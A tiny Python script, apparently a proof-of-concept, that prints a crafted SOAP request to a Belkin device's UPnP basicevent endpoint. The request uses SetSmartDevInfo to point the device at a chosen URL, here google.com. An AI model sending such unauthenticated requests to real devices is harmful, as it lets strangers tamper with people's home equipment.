#!/usr/bin/python
import sys

head = """POST /upnp/control/basicevent1 HTTP/1.1\r\nContent-Type: text/xml; charset="utf-8"\r\nSOAPACTION: "urn:Belkin:service:basicevent1#SetSmartDevInfo"\r\nContent-Length: 316\r\nHOST: 192.168.1.143:49153\r\nUser-Agent: CyberGarage-HTTP/1.0\r\n\r\n"""
body="""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body>
  <u:SetSmartDevInfo xmlns:u="urn:Belkin:service:basicevent:1">
  	<SmartDevURL>http://www.google.com</SmartDevURL>
  </u:SetSmartDevInfo>
 </s:Body>
</s:Envelope>
"""

sys.stdout.write(head+body)
